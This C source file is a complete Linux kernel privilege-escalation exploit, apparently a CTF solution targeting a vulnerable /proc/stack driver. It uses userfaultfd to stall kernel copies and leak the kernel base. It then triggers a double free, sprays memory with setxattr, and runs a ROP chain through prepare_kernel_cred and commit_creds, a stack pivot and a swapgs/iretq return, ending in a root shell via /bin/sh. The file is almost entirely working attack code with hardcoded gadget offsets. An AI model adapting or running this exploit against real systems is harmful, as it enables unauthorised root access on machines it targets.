#include<stdio.h>
#include <inttypes.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <assert.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/xattr.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <unistd.h>
#include <linux/userfaultfd.h>  /* Definition of UFFD* constants */
#include <pthread.h>


typedef struct _Element {
  int owner;
  unsigned long value;
  struct _Element *fd;
  /* In Mem Placement 
   * 0 Next 
   * 8 Pid
   * 12 Padding 
   * 16 Value
   */
} Element;


#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
} while (0)

#define CMD_PUSH 0x57ac0001
#define CMD_POP  0x57ac0002
long page_size = 0x1000;

int fd;
long uffd;
/* void * addr =0x1337000; */
long foobar = 0x1337;
unsigned long kern_base;

const int verbose = 0;

unsigned long user_cs, user_ss, user_rflags, user_sp;

#define debug_print(...)    do { if ( verbose) {printf(__VA_ARGS__);} \
} while (0)


#define input() do { printf("INPUT: "); gets(&val); } while (0)

unsigned long pop(unsigned long buf){
    unsigned long out;
    if (buf){
        ioctl(fd, CMD_POP, buf);
        debug_print("Pop return %lx Errno %d\n", buf, errno);
    }
    else{
        memset(&out, 0, sizeof(out));
        ioctl(fd, CMD_POP, &out);
        debug_print("Pop return %lx Errno %d\n", out, errno);
    }
    return out;
}


void push(unsigned long * buff){
    ioctl(fd, CMD_PUSH, buff);
}

void fault_handler(void * arg){
    puts("[+] Fault monitor thread started");
    int uffd = (long) arg;
    struct pollfd pollfd = {
        .fd = uffd, 
        .events = POLLIN,
    };

    char buf[0x100];
    int nready;
    int bytes_read;
    // Read from fd
    struct uffd_msg msg;
    char *as[0x1000];


    while(1){
        debug_print("Tryin got poll\n");
        nready = poll(&pollfd,1,-1);
        printf("[+] poll() returns: nready = %d; "
        "POLLIN = %d; POLLERR = %d\n", nready,
        (pollfd.revents & POLLIN) != 0,
        (pollfd.revents & POLLERR) != 0);

        bytes_read = read(uffd, &msg,sizeof(msg));
        debug_print("Read %d bytes\n", bytes_read);

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
        }

        printf("[+] Fault at 0x%llx caught\n", msg.arg.pagefault.address);


        struct uffdio_copy copy= {
            .mode = 0,
            // needs to page aligned 
            .len = 0x1000,
            .dst = (unsigned long)msg.arg.pagefault.address & ~(0x1000- 1),
            .src = (unsigned long)as,
            .copy=0,
        };

        /* puts("WAKING"); */
        /* printf("copy return %d\n", ioctl(uffd, UFFDIO_COPY, &copy)); */
        // Not run due to no sleep?? next thing just runs, no time to poll so proceses exits
        /* puts("NOT RUN FOR SOME REAASON"); */

        kern_base = pop(NULL)- 0x13be80;
        printf("[+] KERN BASE: 0x%lx\n", kern_base);

        puts("[+] Releaseing thread");
        // Run copy to unblock
        if (ioctl(uffd, UFFDIO_COPY, &copy) == -1)
            exit("ioctl-UFFDIO_COPY");
    }
}

void fault_handler2(void * arg){
    puts("[+] Fault monitor 2 thread started");
    int uffd = (long) arg;
    struct pollfd pollfd = {
        .fd = uffd, 
        .events = POLLIN,
    };

    char buf[0x100];
    int nready;
    int bytes_read;
    // Read from fd
    struct uffd_msg msg;
    char *as[0x1000];


    while(1){
        debug_print("Tryin got poll\n");
        nready = poll(&pollfd,1,-1);
        printf("[+] poll() returns: nready = %d; "
        "POLLIN = %d; POLLERR = %d\n", nready,
        (pollfd.revents & POLLIN) != 0,
        (pollfd.revents & POLLERR) != 0);

        bytes_read = read(uffd, &msg,sizeof(msg));
        debug_print("Read %d bytes\n", bytes_read);

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
        }

        printf("[+] Fault at 0x%llx caught\n", msg.arg.pagefault.address);

        memset(as, 0x42, 0x1000);

        struct uffdio_copy copy= {
            .mode = 0,
            // needs to page aligned 
            .len = 0x1000,
            .dst = (unsigned long)msg.arg.pagefault.address & ~(0x1000- 1),
            .src = (unsigned long)as,
            .copy=0,
        };

        puts("[+] Doing Crap");
        pop(NULL);    
        puts("[+] Prot_NONE on Page");
        // Change mappings so copy to user fails
        mprotect(0xcafe000, 0x1000, PROT_NONE);

        puts("[+] Releaseing thread");
        // Run copy to unblock
        if (ioctl(uffd, UFFDIO_COPY, &copy) == -1)
            exit("ioctl-UFFDIO_COPY");
    }
}
void fault_handler_bak(void * arg){
    puts("[+] Fault monitor Bak thread started");
    int uffd = (long) arg;
    struct pollfd pollfd = {
        .fd = uffd, 
        .events = POLLIN,
    };

    char buf[0x100];
    int nready;
    int bytes_read;
    // Read from fd
    struct uffd_msg msg;
    char *as[0x1000];


    while(1){
        debug_print("Tryin got poll\n");
        nready = poll(&pollfd,1,-1);
        printf("[+] poll() returns: nready = %d; "
        "POLLIN = %d; POLLERR = %d\n", nready,
        (pollfd.revents & POLLIN) != 0,
        (pollfd.revents & POLLERR) != 0);

        bytes_read = read(uffd, &msg,sizeof(msg));
        debug_print("Read %d bytes\n", bytes_read);

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            fprintf(stderr, "Unexpected event on userfaultfd\n");
        }

        printf("[+] Fault at 0x%llx caught\n", msg.arg.pagefault.address);

        memset(as, 0x42, 0x1000);

        struct uffdio_copy copy= {
            .mode = 0,
            // needs to page aligned 
            .len = 0x1000,
            .dst = (unsigned long)msg.arg.pagefault.address & ~(0x1000- 1),
            .src = (unsigned long)as,
            .copy=0,
        };

        /* puts("WAKING"); */
        /* printf("copy return %d\n", ioctl(uffd, UFFDIO_COPY, &copy)); */
        // Not run due to no sleep?? next thing just runs, no time to poll so proceses exits
        /* puts("NOT RUN FOR SOME REAASON"); */

        puts("[+] Double Free Attempt");
        pop(NULL);

        puts("[+] Releaseing thread");
        // Run copy to unblock
        if (ioctl(uffd, UFFDIO_COPY, &copy) == -1)
            exit("ioctl-UFFDIO_COPY");
    }
}


void register_fault(char* addr, size_t len, void *func, int page_flags){
    pthread_t monitor;
    char * addr2 = mmap(addr, len, page_flags, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
    /* addr = mmap(addr, len, PROT_NONE,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr. */

    if ((uffd= syscall(SYS_userfaultfd, O_NONBLOCK|O_CLOEXEC)) <0){
        printf("Fault Init Failed %ld\n", uffd);
    }

    struct uffdio_api api = {
        .api = UFFD_API,
        .features= 0,
        .ioctls = 0,
    };

    // https://man7.org/linux/man-pages/man2/ioctl_userfaultfd.2.html
    int hand = ioctl(uffd, UFFDIO_API, &api);
    debug_print("API Handshake %d\n", hand);

    struct uffdio_register reg  = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range.len = 0x10000,
        .range.start= (unsigned long long)addr2,
    };

    int regs = ioctl(uffd,UFFDIO_REGISTER , &reg);
    debug_print("Register %d\n", regs);

    printf("[+] Userfault Registered\n");
    int monitor_ret =  pthread_create(&monitor, NULL, func, (void*)uffd);
};

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}


void save_state2(){
    __asm__(
            ".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax"
            );
    printf("[+] Save State");
}

void get_shell(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}



int main (int argc, char *argv[])
{
    save_state();
    printf("[+] PID: %d\n", getpid());
    unsigned long val = 0xdeadbeef;
    unsigned long a= 0x4141414141414141;
    unsigned long b= 0x4242424242424242;
    unsigned long out = 0;
    int faultfd;

    register_fault((void *)0x1337000,0x1000, fault_handler,PROT_WRITE|PROT_EXEC|PROT_READ);
    register_fault((void *)0xdead000,0x1000, fault_handler_bak,PROT_WRITE|PROT_EXEC);
    // FOr setxattr 
    register_fault((void *)0xcafe000,0x1000, fault_handler2,PROT_WRITE);
    // Wait for monitor threads
    sleep(2);

    fd = open("/proc/stack", O_RDONLY);

    int stat = open("/proc/self/stat", O_RDONLY);
    close(stat);
    // Leaks
    push(0x1337000);

    // Double FREEEEEEEEEE
    push(0xcafe000);

    // Other Double Freeee
    /* push(&val); */
    /* pop(0xdead000); */


    /* // Test double free kmalloc 0xd7 */
    stat = open("/proc/self/stat", O_RDONLY);

    char buf[0x1000];

    // gadgets 
    unsigned long prepare_cred = 433664 + kern_base;
    unsigned long commit_creds = 433168 + kern_base;
    unsigned long pivot = kern_base + 4880548;
    unsigned long pop_rdi = 214277 + kern_base;
    unsigned long push_rax = 1778828 + kern_base;
    unsigned long ret = 2843407 + kern_base;
    unsigned long rdi_rax= 5931407 + kern_base;
    unsigned long iretq= 6296389 + kern_base;
    unsigned long swap_regs= 6294090 + kern_base;

    unsigned long* payload = mmap(0x5d4a0000, 0x9000000, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0) +65560+1048576 -8;
    memset(0x5d4a0000, 0x0,0x9000000);
    printf("[+] Mmaped payload buffer at %p Errno %d\n", payload, errno);


    *payload++ = pop_rdi;
    *payload++ = 0;
    *payload++ = prepare_cred;
    *payload++ = rdi_rax;
    *payload++ = commit_creds;


    /* *payload++ = iretq; */
    *payload++ = swap_regs;
    // RIP|CS|RFLAGS|SP|SS   < Swap adds pop rax rdi
    *payload++ = 0xdeadbeef;
    *payload++ = 0xcafebabe;
    *payload++ = (unsigned long)get_shell;
    *payload++ = user_cs;
    *payload++ = user_rflags;
    *payload++ = user_sp;
    *payload++ = user_ss;



    memset(buf, 0x41, 0x1000);
    for ( int i = 0; i < 0x1000 ; i+=8){
        *(unsigned long*)&buf[i] = pivot;
    }
    setxattr("/tmp", "SHE_IS_SUMMER", buf, 0x20, XATTR_CREATE);

    // Rsi => Userspace Addr Rdx=> malloc buffer, first 8 is non controllable
    read(stat,&buf, 0x100);


    return 0;
}
